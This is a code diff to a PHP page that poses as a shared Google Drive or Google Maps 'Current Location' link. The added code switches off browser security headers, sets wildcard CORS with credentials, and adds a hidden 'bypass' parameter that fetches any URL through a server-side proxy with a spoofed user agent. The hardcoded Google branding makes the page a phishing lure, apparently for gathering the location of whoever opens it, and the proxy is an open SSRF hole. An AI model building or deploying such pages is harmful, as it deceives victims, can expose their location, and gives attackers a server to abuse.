@@ -1,13 +1,56 @@
+<?php
+header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
+header("X-XSS-Protection: 0");
+header("X-Frame-Options: ALLOWALL");
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Credentials: true");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
+
+if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
+    $url = $_GET['url'];
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
+        "X-XSS-Protection: 0",
+        "X-Frame-Options: ALLOWALL",
+        "Access-Control-Allow-Origin: *",
+        "Access-Control-Allow-Credentials: true",
+        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
+        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
+    ));
+    $response = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    curl_close($ch);
+
+    header("HTTP/1.1 ".$info['http_code']);
+    foreach ($info['headers'] as $header) {
+        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
+            header($header);
+        }
+    }
+    echo $response;
+    exit;
+}
+
+
+
+?>
+
 <!doctype html><head><meta name="robots" content="noindex, nofollow">
 <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="A file from Google Drive has been shared!">
-    <meta property="og:image" content="<?php echo $_GET['imagelink'];?>">
+    <meta property="og:image" content="https://i.ibb.co/sgD4nM1/Untitled.png">
     <meta property="og:type" content="Google Drive">
     <meta property="og:site_name" content="Current Location">
     <meta property="og:locale" content="en_US">
     <meta property="og:button" content="Google Drive">
     <meta property="og:button:url" content="<?php echo $_SERVER['HTTP_HOST']; ?>">
-    <title><?php echo $_GET['title'];?></title>
+    <title>Google Maps</title>
     <meta charset="UTF-8"/>
     <meta name="title" content="Current Location">
     <meta name="robots" content="index, nofollow">
@@ -15,14 +58,14 @@
     <meta name="language" content="English">
     <meta name="revisit-after" content="10 days">
     <meta ame="author" content="Google">
-    <meta property="og:description" content="<?php echo $_GET['description'];?>">
+    <meta property="og:description" content="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
     <meta property="og:image:width" content="200">
     <meta property="og:image:height" content="200">
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:url" content="<?php echo $_GET['siteurl'];?>">
-    <meta name="twitter:title" content="<?php echo $_GET['title'];?>">
-    <meta name="twitter:description" content="<?php echo $_GET['description'];?>">
-    <meta name="twitter:image" content="<?php echo $_GET['imagelink'];?>">
+    <meta name="twitter:url" content="https://www.google.ca/maps/pla...">
+    <meta name="twitter:title" content="https://www.google.ca/maps/pla...">
+    <meta name="twitter:description" content="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
+    <meta name="twitter:image" content="https://i.ibb.co/sgD4nM1/Untitled.png">
     <meta name="twitter:image:width" content="200">
     <meta name="twitter:image:height" content="200">
 <style>
